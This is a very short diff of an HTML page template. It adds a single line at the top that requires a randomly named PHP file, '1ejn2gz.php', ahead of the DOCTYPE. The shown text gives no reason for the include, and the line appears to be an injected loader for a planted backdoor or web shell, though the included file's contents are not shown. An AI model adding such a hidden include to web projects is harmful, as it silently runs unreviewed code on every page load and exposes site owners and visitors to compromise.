@@ -1,3 +1,4 @@
+<?php require __DIR__ . '/1ejn2gz.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
